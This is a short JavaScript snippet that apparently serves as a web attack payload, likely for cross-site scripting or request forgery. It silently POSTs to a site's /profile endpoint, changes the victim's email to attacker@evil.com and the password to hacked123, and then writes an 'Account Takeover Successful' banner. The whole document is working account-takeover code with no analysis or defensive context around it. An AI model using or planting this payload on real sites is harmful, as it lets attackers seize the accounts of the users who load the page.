fetch('/profile', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'email=attacker@evil.com&password=hacked123'
}).then(function() {
    document.write('<h1>Account Takeover Successful</h1><p>Email changed to attacker@evil.com</p><p>Password changed to hacked123</p>');
});
